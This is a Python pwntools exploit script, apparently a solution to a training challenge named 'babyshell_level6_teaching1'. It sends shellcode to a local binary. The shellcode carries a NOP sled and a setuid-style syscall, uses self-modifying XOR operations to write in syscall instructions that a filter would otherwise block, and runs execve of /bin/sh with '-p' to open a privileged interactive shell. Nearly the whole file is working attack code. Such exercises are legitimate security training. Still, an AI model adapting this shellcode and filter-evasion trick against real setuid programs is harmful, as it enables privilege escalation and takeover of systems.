#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = '/bin/bash'
exe = '/babyshell_level6_teaching1'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

shellcode = "nop;" * 4096 + """
xor rdi, rdi;
mov rax, 105;
add dx, 0x1014;
xor word ptr [rdx], 0x959f;
nop;
nop;
xor rax, rax;
push rax;
mov rax, 0x0068732f6e69622f;
push rax;
mov rdi, rsp;
mov rax, 0x2d70;
push rax;
xor rax, rax;
push rax;
mov rsi, rsp;
mov rax, 59;
xor rdx, rdx;
add cx, 0x34;
xor word ptr [rcx], 0x959f;
nop; 
nop;
"""

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.send(asm(shellcode))

io.interactive()

